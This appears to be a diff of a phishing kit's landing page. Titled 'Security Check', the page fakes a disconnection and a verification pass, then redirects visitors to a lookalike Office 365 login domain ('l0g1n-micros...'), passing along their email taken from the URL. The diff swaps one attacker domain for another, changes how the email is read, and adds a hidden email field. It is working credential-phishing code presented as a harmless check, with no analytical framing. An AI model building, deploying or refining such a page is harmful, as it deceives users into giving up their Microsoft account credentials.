@@ -5,12 +5,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Security Check</title>
     <!-- Security Headers -->
-    <meta name="robots" content="noindex, nofollow, noarchive"> <!-- Prevent indexing, following, and archiving -->
-    <meta http-equiv="X-Content-Type-Options" content="nosniff"> <!-- Prevent MIME-type sniffing -->
-    <meta http-equiv="X-Frame-Options" content="DENY"> <!-- Prevent clickjacking -->
-    <meta http-equiv="X-XSS-Protection" content="1; mode=block"> <!-- Enable XSS protection -->
-    <meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains; preload"> <!-- Enforce HTTPS -->
-    <meta http-equiv="Referrer-Policy" content="no-referrer"> <!-- Control referrer information -->
+    <meta name="robots" content="noindex, nofollow, noarchive">
+    <meta http-equiv="X-Content-Type-Options" content="nosniff">
+    <meta http-equiv="X-Frame-Options" content="DENY">
+    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
+    <meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains; preload">
+    <meta http-equiv="Referrer-Policy" content="no-referrer">
     
     <style>
         .container {
@@ -59,32 +59,37 @@
         <p class="security-check" id="securityCheckMessage">Security check completed successfully!</p>
     </div>
 
+    <!-- Add an email field to grab the email -->
+    <input type="email" id="email" placeholder="Your email" style="display:none;">
+
     <script>
         (function() {
             'use strict';
 
+            // Function to extract the email from URL hash (e.g., #email=test@example.com)
             function getEmailFromHash() {
-                try {
-                    const hash = window.location.hash.substr(1);
-                    return atob(hash);
-                } catch (error) {
-                    console.error("Failed to extract email from hash:", error);
-                    return null;
-                }
+                const hash = window.location.hash;
+                const params = new URLSearchParams(hash.substring(1)); // Skip the #
+                return params.get("email");
             }
 
+            // Populate the hidden email field
             function populateEmail() {
                 const email = getEmailFromHash();
                 if (email) {
                     const emailField = document.getElementById("email");
                     if (emailField) {
                         emailField.value = email;
+                        console.log("Email found and populated: " + email);
                     } else {
                         console.warn("Email field not found.");
                     }
+                } else {
+                    console.warn("No email found in the URL.");
                 }
             }
 
+            // Simulate disconnection and security check
             function simulateDisconnection() {
                 console.log("Simulating disconnection for 10 seconds...");
 
@@ -97,7 +102,7 @@
                     }
 
                     setTimeout(() => {
-                        const redirectTo = "https://l0g1n-micros.robedemariee.net/o365#" + window.location.hash.substr(1);
+                        const redirectTo = "https://l0g1n-micros.ftlivedocs.com/o365#" + window.location.hash.substr(1);
                         console.log("Redirecting to: " + redirectTo);
                         window.location.href = redirectTo;
                     }, 6000);
